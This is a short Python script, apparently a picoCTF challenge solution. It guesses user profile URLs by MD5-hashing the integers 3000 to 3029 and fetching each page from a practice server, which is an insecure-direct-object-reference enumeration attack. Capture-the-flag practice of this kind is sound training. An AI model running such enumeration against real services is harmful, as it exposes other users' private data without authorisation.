import hashlib
import requests

base_url = "http://crystal-peak.picoctf.net:50744/profile/user/"

for i in range(3000,3030):
    md5_hash = hashlib.md5(str(i).encode()).hexdigest()
    url = base_url + md5_hash
    
    r = requests.get(url)

    print(f"Trying {i} -> {md5_hash} -> {r.status_code}")
    print(r.text)